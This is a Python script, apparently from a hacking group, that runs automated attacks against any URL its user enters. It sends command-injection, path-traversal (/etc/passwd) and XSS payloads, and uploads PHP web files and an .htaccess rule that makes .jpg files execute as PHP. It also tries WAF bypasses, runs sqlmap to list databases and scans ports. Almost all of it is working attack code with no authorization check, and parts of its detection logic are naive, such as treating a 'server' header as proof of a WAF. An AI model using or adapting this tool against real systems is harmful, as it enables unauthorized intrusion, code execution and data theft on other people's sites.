import requests
from urllib.parse import quote
from termcolor import colored
import subprocess
import socket
import pyfiglet
import colorama
from colorama import Fore

# ASCII Sanatı
def display_ascii_art():
    metin = "Root"
    ascii_art = pyfiglet.figlet_format(metin)
    colorama.init()
    print(Fore.RED + ascii_art)
    print(colored("t.me/sarsilmazhackteam", 'red'))

# Güvenli HTTP isteği
def safe_request(url, method='GET', data=None, files=None, headers=None):
    try:
        if method == 'POST':
            response = requests.post(url, data=data, files=files, headers=headers, timeout=10)
        else:
            response = requests.get(url, headers=headers, timeout=10)
        response.raise_for_status()
        return response
    except requests.exceptions.RequestException as e:
        print(colored(f"[!] HTTP isteği başarısız: {str(e)}", 'red'))
        return None

# Komut Enjeksiyonu Testi
def test_command_injection(url):
    print(colored("[*] Komut Enjeksiyonu testi yapılıyor...", 'yellow'))
    payload = "; ls"
    encoded_payload = quote(payload)
    test_url = f"{url}{encoded_payload}"
    response = safe_request(test_url)
    if response and ("bin" in response.text or "usr" in response.text):
        print(colored("[!] Komut Enjeksiyonu açığı bulundu!", 'red'))
        return True
    print(colored("[+] Komut Enjeksiyonu açığı bulunamadı.", 'green'))
    return False

# Dizin Gezinmesi Testi
def test_open_directory(url):
    print(colored("[*] Açık dizin testi yapılıyor...", 'yellow'))
    response = safe_request(url)
    if response and ("index of" in response.text.lower() or "parent directory" in response.text.lower()):
        print(colored("[!] Açık dizin tespit edildi!", 'red'))
        return True
    print(colored("[+] Açık dizin bulunamadı.", 'green'))
    return False

# Dosya Dahil Etme Testi
def test_file_inclusion(url):
    print(colored("[*] Dosya Dahil Etme testi yapılıyor...", 'yellow'))
    payload = "?page=../../../../etc/passwd"
    test_url = f"{url}{payload}"
    response = safe_request(test_url)
    if response and "root:" in response.text:
        print(colored("[!] Dosya Dahil Etme açığı bulundu!", 'red'))
        return True
    print(colored("[+] Dosya Dahil Etme açığı bulunamadı.", 'green'))
    return False

# XSS Testi
def test_xss(url):
    print(colored("[*] XSS testi yapılıyor...", 'yellow'))
    payload = "<script>alert('XSS')</script>"
    test_url = f"{url}?search={payload}"
    response = safe_request(test_url)
    if response and payload in response.text:
        print(colored("[!] XSS açığı bulundu!", 'red'))
    else:
        print(colored("[+] XSS açığı bulunamadı.", 'green'))

# CSRF Testi
def test_csrf(url):
    print(colored("[*] CSRF testi yapılıyor...", 'yellow'))
    headers = {'Origin': url}
    response = requests.post(url, headers=headers)
    if response and "forbidden" in response.text.lower():
        print(colored("[+] CSRF koruması var.", 'green'))
    else:
        print(colored("[!] CSRF açığı bulunabilir.", 'red'))

# **Dosya Yükleme Güvenlik Testi**
def test_file_upload(url):
    print(colored("[*] Dosya Yükleme testi yapılıyor...", 'yellow'))

    # Test edilecek farklı dosya türleri
    test_files = {
        'php': ('test.php', '<?php echo "test"; ?>'),
        'php2': ('test.phtml', '<?php echo "test"; ?>'),
        'jpg': ('test.jpg', '<?php echo "test"; ?>'),  # JPG olarak yüklenip çalıştırılabilir mi?
        'htaccess': ('.htaccess', 'AddType application/x-httpd-php .jpg'),
        'php_bypass': ('test.php.', '<?php echo "test"; ?>'),  # PHP uzantılı dosya bypass edilirse?
    }

    for file_type, file_data in test_files.items():
        files = {'file': file_data}
        response = safe_request(url, method='POST', files=files)
        
        if response:
            print(colored(f"[+] {file_data[0]} dosyası ile yükleme denemesi tamamlandı.", 'yellow'))

            # Eğer sunucudan "test" çıktısını alıyorsak dosya çalıştırılmış demektir
            if "test" in response.text:
                print(colored(f"[!] {file_data[0]} ile dosya yükleme açığı bulundu!", 'red'))

                # **Genişletilmiş Olası Dizin Yolları**
                possible_paths = [
                    "uploads", "files", "upload", "img", "image", "temp", "tmp", "storage",
                    "public/uploads", "public/files", "media", "assets", "static", "static/uploads",
                    "cdn", "images", "pictures", "gallery", "user_uploads", "docs", "download",
                    "admin/uploads", "admin/files", "site_media", "backup", "server_files",
                    "attachments", "resources", "public/images", "public/assets",
                    "uploads/avatars", "uploads/temp", "media_library", "cdn/images",
                    "ftp_files", "data", "files_store", "user_content", "public_html/uploads",
                    "public_html/files", "resources/uploads", "uploads/profile_pictures"
                ]

                for path in possible_paths:
                    test_file_url = f"{url}/{path}/{file_data[0]}"
                    check_response = safe_request(test_file_url)
                    
                    if check_response and "test" in check_response.text:
                        print(colored(f"[!] Yüklenen dosyanın çalıştığı URL: {test_file_url}", 'red'))
                        return test_file_url  
                       
                       # Açık tespit edilen URL döndürülür
                
                print(colored("[!] Dosya yüklendi fakat nerede olduğu tespit edilemedi. Elle kontrol ediniz.", 'yellow'))
            else:
                print(colored(f"[+] {file_data[0]} dosyası ile yükleme açığı bulunamadı.", 'green'))
        else:
            print(colored(f"[!] {file_data[0]} dosyası ile yükleme testi başarısız oldu. Sunucu yanıt vermedi.", 'red'))

    return None

# WAF Tespiti
def detect_waf(url):
    print(colored("[*] WAF tespiti yapılıyor...", 'yellow'))
    response = safe_request(url)
    waf_signatures = ['cf-ray', 'x-robots-tag', 'server', 'x-waf']
    if response:
        for signature in waf_signatures:
            if signature in response.headers:
                print(colored(f"[+] WAF tespit edildi: {signature}", 'yellow'))
                return True
    print(colored("[+] WAF tespit edilmedi.", 'green'))
    return False

# WAF Bypass Teknikleri
def bypass_waf(url):
    print(colored("[*] WAF bypass denemesi yapılıyor...", 'yellow'))
    
    # WAF bypass teknikleri
    techniques = [
        ("Parametre Kirliliği", "?id=1&id=2"),
        ("Büyük/Küçük Harf Manipülasyonu", "?id=1 AND 1=1"),
        ("Null Byte Injection", "?id=1%00"),
        ("Content-Type Manipülasyonu", {"Content-Type": "application/json"}),
    ]

    for technique_name, payload in techniques:
        print(colored(f"[*] {technique_name} deneniyor...", 'yellow'))
        if isinstance(payload, dict):  # Content-Type manipülasyonu
            response = safe_request(url, headers=payload)
        else:  # Diğer teknikler
            response = safe_request(f"{url}{payload}")
        
        if response and response.status_code == 200:
            print(colored(f"[!] {technique_name} ile WAF bypass edildi!", 'red'))
            return True
        else:
            print(colored(f"[+] {technique_name} ile WAF bypass edilemedi.", 'green'))
    
    print(colored("[+] WAF bypass edilemedi.", 'green'))
    return False

# SQLMap ile Veritabanı Tespiti
def detect_sql_database(url):
    print(colored("[*] SQLMap ile veritabanları tespit ediliyor...", 'yellow'))
    try:
        command = ["sqlmap", "-u", url, "--batch", "--dbs", "--output-dir=/tmp/sqlmap_output"]
        result = subprocess.run(command, capture_output=True, text=True)
        if "available databases" in result.stdout.lower():
            print(colored("[!] Bulunan veritabanları:", 'red'))
            for line in result.stdout.splitlines():
                if line.strip() and not line.strip().startswith("[*]"):
                    print(line.strip())
        else:
            print(colored("[+] SQL Injection açığı bulunamadı veya SQLMap çalıştırılamadı.", 'green'))
    except FileNotFoundError:
        print(colored("[!] SQLMap yüklü değil. Lütfen sqlmap'in kurulu olduğundan emin olun.", 'red'))
    except Exception as e:
        print(colored(f"[!] SQLMap çalıştırılırken bir hata oluştu: {str(e)}", 'red'))

# Port Tarama
def scan_ports(host, ports=[80, 443, 8080, 21, 22, 3306]):
    print(colored("[*] Port taraması yapılıyor...", 'yellow'))
    for port in ports:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            result = s.connect_ex((host, port))
            if result == 0:
                print(colored(f"[+] Port {port} açık.", 'green'))
            else:
                print(colored(f"[-] Port {port} kapalı.", 'red'))

# Tarama Fonksiyonu
def scan_url(url):
    print(colored(f"\n[+] {url} taranıyor...\n", 'yellow'))
    test_command_injection(url)  # İlk test
    test_open_directory(url)
    test_file_inclusion(url)
    test_xss(url)
    test_csrf(url)
    test_file_upload(url)
    if detect_waf(url):  # WAF tespiti
        bypass_waf(url)  # WAF bypass denemesi
    scan_ports(url.replace("https://", "").replace("http://", ""))  # Nmap tarzı port taraması
    detect_sql_database(url)  # En son SQLMap çalıştır

# Ana Fonksiyon
def main():
    display_ascii_art()
    url = input(colored("[?] Taranacak URL: ", 'cyan'))
    if not url.startswith("http://") and not url.startswith("https://"):
        print(colored("[!] Lütfen geçerli bir URL girin. (http:// veya https:// ile başlamalı)", 'red'))
        return
    scan_url(url)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(colored("\n[!] İşlem kullanıcı tarafından durduruldu.", 'red'))